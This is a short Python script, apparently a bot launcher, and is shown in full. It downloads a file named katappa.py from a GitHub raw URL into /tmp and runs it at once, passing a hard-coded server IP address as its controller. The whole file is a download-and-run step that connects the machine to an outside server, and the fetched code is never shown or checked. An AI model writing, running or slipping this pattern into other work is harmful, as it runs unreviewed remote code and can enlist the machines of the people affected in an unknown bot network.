import urllib.request, subprocess, sys

SERVER_URL = 'http://72.61.239.29/'

urllib.request.urlretrieve(
    'https://raw.githubusercontent.com/Junaid4ever/zbots/main/katappa.py',
    '/tmp/katappa.py'
)
subprocess.run([sys.executable, '-u', '/tmp/katappa.py', '--server', SERVER_URL])
